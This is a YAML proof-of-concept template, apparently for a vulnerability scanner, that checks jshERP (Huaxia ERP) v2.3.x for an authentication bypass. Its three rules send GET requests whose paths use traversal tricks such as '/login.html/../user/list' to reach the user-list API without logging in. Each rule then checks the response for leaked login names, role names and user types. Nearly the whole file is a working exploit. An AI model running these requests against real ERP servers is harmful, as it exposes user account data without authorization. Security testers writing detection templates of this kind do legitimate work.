name: poc-yaml-jsherp-auth-bypass
binding: 6f60808f-3ca2-4b8e-b8ce-93f0cf539c60
manual: true
detail:
    author: secking
    links:
        - https://github.com/jishenghua/jshERP
        - https://cdn.modb.pro/db/546938
    vulnerability:
        id: CT-529836
        level: high
    description: 华夏ERP v2.3.x 版本存在权限效验绕过去访问接口。
transport: http
set:
    num: randomLowercase(5)
rules:
    r0:
        request:
            cache: false
            method: GET
            path: /user/{{num}}.png/../list?search=%7B%22userName%22%3A%22%22%2C%22loginName%22%3A%22%22%7D&currentPage=1&pageSize=10&t=
            headers:
                Accept: application/json
        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(bytes("loginName")) && response.body.bcontains(bytes("roleName")) && response.body.bcontains(bytes("userType"))
    r1:
        request:
            cache: false
            method: GET
            path: /login.html/../user/list?search=%7B%22userName%22%3A%22%22%2C%22loginName%22%3A%22%22%7D&currentPage=1&pageSize=10&t=
            headers:
                Accept: application/json
        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(bytes("loginName")) && response.body.bcontains(bytes("roleName")) && response.body.bcontains(bytes("userType"))
    r2:
        request:
            cache: false
            method: GET
            path: /user/login/../../user/list?search=%7B%22userName%22%3A%22%22%2C%22loginName%22%3A%22%22%7D&currentPage=1&pageSize=10&t=
            headers:
                Accept: application/json
        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(bytes("loginName")) && response.body.bcontains(bytes("roleName")) && response.body.bcontains(bytes("userType"))
expression: r0() || r1() || r2()
